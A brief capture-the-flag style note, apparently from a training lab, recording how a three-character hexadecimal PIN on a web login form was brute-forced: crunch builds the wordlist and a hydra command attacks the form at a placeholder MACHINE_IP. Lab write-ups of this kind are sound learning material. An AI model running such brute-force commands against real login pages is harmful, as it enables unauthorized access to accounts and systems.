Todays challenge: Brute-forcing

Used the tool crunch to generate password list

    crunch 3 3 0123456789ABCDEF -o 3digits.txt
            

    Use hydra to bruteforce the pin

hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
